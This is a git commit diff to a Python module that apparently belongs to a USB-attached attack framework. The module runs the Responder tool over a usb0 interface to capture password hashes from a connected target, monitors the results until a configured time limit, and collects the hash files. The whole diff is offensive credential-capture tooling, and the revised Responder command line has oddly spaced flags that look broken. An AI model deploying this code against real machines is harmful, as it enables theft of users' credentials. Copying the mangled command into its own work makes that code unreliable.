d0183d6a01c6fa7f8a1371eb3665636b91c97e44
Joh98 <jdjr98@gmail.com>
2018-03-20 13:27:59 +0000

    Implemented the use of "Responder.ini".

--- components/modules/Responder/Responder.py
+++ components/modules/Responder/Responder.py
@@ -4,6 +4,7 @@ import time
 
 from components.framework.Debug import Debug
 from components.framework.network import FwComponentNetwork
+from components.helpers.ModuleManager import ModuleManager
 
 network = FwComponentNetwork()
 
@@ -43,34 +44,46 @@ class Responder(Debug):
         super().__init__(name="Responder", type="Module", debug=debug)
         subprocess.run("mkdir -p ../hashes", shell=True)  # If the "hashes" directory doesn't exist, create it
 
+        # Setup module manager
+        self.module_manager = ModuleManager(debug=debug, save_needs_confirm=True)
+
+        # import config data for this module
+        self.current_config = self.module_manager.get_module_by_name(self._name)
+        if not self.current_config:
+            self.debug("Error: could not import config of " + self._name)
+
     # Method used to capture password hashes from target using Spiderlabs' Responder
-    def capture(self, timer):
+    def capture(self):
+
+        time_to_live = self.current_config.options["time_to_live"]  # Grab Responder's "time to live" from the .ini
+
+        def monitor_responder():  # "Stolen from PiKey"
+
+            # Determine the last modified time of Responder.db
+            timestamp_old = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
+            time_to_run = time.time() + time_to_live  # Set Responder "time to live"
+
+            while time.time() < time_to_run:  # While running time < "time to live"
+                timestamp_new = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
+                if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
+                    time.sleep(2)
+                    return True
+
+            return False
+
         network.up()  # Up usb0
-        process = subprocess.Popen("exec python ../components/modules/Responder/src/Responder.py -I usb0 -w -r -f",
-                                   shell=True)  # Run Responder on usb0
-        hash_success = monitor_responder(timer)  # Call method that will determine if hashes have been captured
+        process = subprocess.Popen("exec python ../components/modules/Responder/src/Responder.py -I usb0 "
+                                   "-f - w - r - d - F", shell=True)  # Run Responder on usb0
+
+        hash_success = monitor_responder()  # Call the method that will determine if hashes have been captured
         process.kill()  # Kill Responder
         network.down()  # Down usb0
 
-        # Move txt files that contain the hashes to a more central directory (hashes directory)
+        # Move txt files that contain the hashes to a more central directory (hashes directory) if hashes were captured
         if hash_success:
-            subprocess.run("find ../components/modules/Responder/src/logs -name '*.txt' -exec mv {} ../hashes \;",
-                       shell=True)
+            subprocess.run("find ../components/modules/Responder/src/logs -name '*.txt' -exec mv {} "
+                           "../hashes \;", shell=True)
 
         return True
 
-
-def monitor_responder(timer):  # "Stolen from PiKey"
-
-    # Determine the last modified time of Responder.db
-    timestamp_old = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
-    time_to_run = time.time() + timer  # Set Responder "time to live"
-
-    while time.time() < time_to_run:  # While running time < "time to live"
-        timestamp_new = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
-        if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
-            time.sleep(2)
-            return True
-
-    return False
 
